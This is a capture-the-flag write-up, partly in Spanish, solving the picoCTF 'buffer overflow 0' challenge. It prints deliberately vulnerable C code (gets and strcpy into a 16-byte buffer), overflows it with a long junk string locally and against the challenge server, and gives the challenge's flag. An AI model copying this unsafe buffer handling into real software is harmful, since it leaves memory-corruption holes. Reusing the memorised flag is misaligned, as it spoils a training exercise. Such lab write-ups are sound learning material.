## Descripción 
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).

Additional details will be available after launching your challenge instance.

## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
```bash
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ mkdir buffer+overflow_0
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ cd buffer+overflow_0 
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ wget https://artifacts.picoctf.net/c/174/vuln.c            
--2024-11-11 19:05:39--  https://artifacts.picoctf.net/c/174/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.26, 3.161.55.64, 3.161.55.100, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.26|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c               100%[===================>]     808  --.-KB/s    in 0s      

2024-11-11 19:05:40 (4.23 MB/s) - ‘vuln.c’ saved [808/808]

                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ cat vuln.c            
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ wget https://artifacts.picoctf.net/c/174/vuln   
--2024-11-11 19:06:27--  https://artifacts.picoctf.net/c/174/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.26, 3.161.55.64, 3.161.55.100, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.26|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                 100%[===================>]  15.64K  --.-KB/s    in 0.003s  

2024-11-11 19:06:28 (5.36 MB/s) - ‘vuln’ saved [16016/16016]

```


```bash
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ chmod +x vuln   
                                                                                  
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ file vuln          
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                                  
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ ./vuln  
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                  
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ echo 'flag{dummieflag}' > flag.txt
                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ ./vuln                            
Input: dfadfadfa fa
The program will exit now
                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ ./vuln
Input: jdashfljkhdsjfhenbuacbaerhbcheabfaeuchfaeuiwnfiuaygnfaygfiaexygiyagfiyaxgfyisgcvybvybrytnstuaieayfguygenfiyuxgaenwyuxfgainyegxfiayeugxfuayegxfiyequgfuywgfiuqeywgfniuqewygfxniyeugxnfiyaungefiayewgfiayewxfgaiynewfgxnaouyef
flag{dummieflag}


┌──(kali㉿kali)-[~/retosBinaryExploit/buffer+overflow_0]
└─$ nc saturn.picoctf.net 62290

Input: kjdfjkadhfjkadshfjkhasjdkfhjkasdhjkfhjkasdhfjkhueiahbfhbaeuifbaiusdhfbiuaesbfiuabesiufbaieubfaisludfhbaeiubfaiusbdfiuoaehbfiuabeiufbaiuebfuiabefiuabfiuoeabfiuobeuiabfebuiabeafuieuiauifuiabjkdbnfuiabfiueabfa
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

```

- Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/257